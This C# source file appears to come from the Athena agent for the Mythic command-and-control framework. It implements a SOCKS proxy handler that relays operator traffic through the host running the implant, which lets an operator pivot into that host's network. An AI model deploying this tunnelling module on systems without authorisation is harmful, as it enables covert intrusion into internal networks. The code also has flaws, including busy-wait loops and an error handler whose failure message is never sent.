using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{
    // Good Implementation:
    

    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private ConcurrentDictionary<int, SocksConnection> connections { get; set; }
        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
        private ConcurrentQueue<SocksMessage> messagesIn = new ConcurrentQueue<SocksMessage>();
        public bool running { get; set; }
        static object _lock = new object();
        
        public SocksHandler()
        {
            this.running = false;
            this.connections = new ConcurrentDictionary<int, SocksConnection>();
        }

        public bool Start()
        {
            this.ct = new CancellationTokenSource();
            try
            {
                Task.Run(() =>
                {
                    while (!this.ct.IsCancellationRequested)
                    {
                        try
                        {
                            ReadMythicMessages();
                        }
                        catch (Exception e)
                        {
                            Misc.WriteError(e.Message);
                            continue;
                        }
                    }
                });
            }
            catch
            {
                this.Stop();
                return false;
            }
            return true;
        }

        public bool Stop()
        {
            try
            {
                this.running = false;
                if (this.ct is not null)
                {
                    this.ct.Cancel();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
        public List<SocksMessage> GetMessages()
        {
            if(this.messagesOut.Count < 1)
            {
                return new List<SocksMessage>();
            }

            List<SocksMessage> msgOut;

            lock (_lock)
            {
                msgOut = new List<SocksMessage>(this.messagesOut);
                this.messagesOut.Clear();
            }
            msgOut.Reverse();
            return msgOut;
        }
        public void AddToQueue(SocksMessage message)
        {
            this.messagesIn.Enqueue(message);
        }
        public void ReturnMessage(SocksMessage message)
        {
            Misc.WriteDebug("Adding message to outqueue.");
            if (Monitor.TryEnter(_lock, 5000))
            {
                this.messagesOut.Add(message);
                Monitor.Exit(_lock);
            }
        }
        private void ReadMythicMessages()
        {
            while (!this.ct.IsCancellationRequested)
            {
                SocksMessage sm;
                while (!messagesIn.TryDequeue(out sm)) { }
                Task.Run(() => { HandleMessage(sm); });
            }
        }

        private void ReadServerMessages()
        {
            Parallel.ForEach(connections, connection =>
            {
                if(connection.Value.BytesReceived > 0)
                {
                    connection.Value.ReceiveAsync();
                }
            });
        }

        public int Count()
        {
            return this.messagesOut.Count();
        }

        //This function will send messages from the Server TO mythic.
        //Server -> Athena -> Mythic -> Client
        private void HandleMessage(SocksMessage sm)
        {

            if (this.connections.ContainsKey(sm.server_id))
            {
                this.connections[sm.server_id].SendAsync(Misc.Base64DecodeToByteArray(sm.data)).ToString();
                if (!this.connections[sm.server_id].listening)
                {
                    this.connections[sm.server_id].StartReceiveAsync();
                }
            }
            else
            {
                HandleNewConnection(sm);
            }
        }
        private void HandleNewConnection(SocksMessage sm)
        {
            try
            {

                ConnectionOptions co = new ConnectionOptions(sm);
                SocksConnection sc = new SocksConnection(co);
                ConnectResponse cr = new ConnectResponse()
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                };

                SocksMessage smOut = new SocksMessage()
                {
                    server_id = sm.server_id
                };

                if (sc.Connect())
                {
                    //Add connection to tracker
                    while (!this.connections.TryAdd(sm.server_id, sc)) { }
                    this.connections.AddOrUpdate(sm.server_id, sc, (key, oldValue) => sc);
                    cr.status = ConnectResponseStatus.Success;
                    this.connections[sm.server_id].StartReceiveAsync();
                    smOut.exit = false;
                    //Add to our message queue
                }
                else
                {
                    cr.status = ConnectResponseStatus.GeneralFailure;
                    smOut.exit = true;
                }
                cr.addrtype = co.addressType;

                //Put our ConnectResponse into the SocksMessage
                smOut.data = Misc.Base64Encode(cr.ToByte());

                //Return message
                ReturnMessage(smOut);
            }
            catch (Exception e)
            {
                ConnectResponse cr = new ConnectResponse()
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                    status = ConnectResponseStatus.GeneralFailure,
                };

                SocksMessage smOut = new SocksMessage()
                {
                    server_id = sm.server_id,
                    exit = true,
                    data = Misc.Base64Encode(cr.ToByte())
                };
            }
        }
    }
}
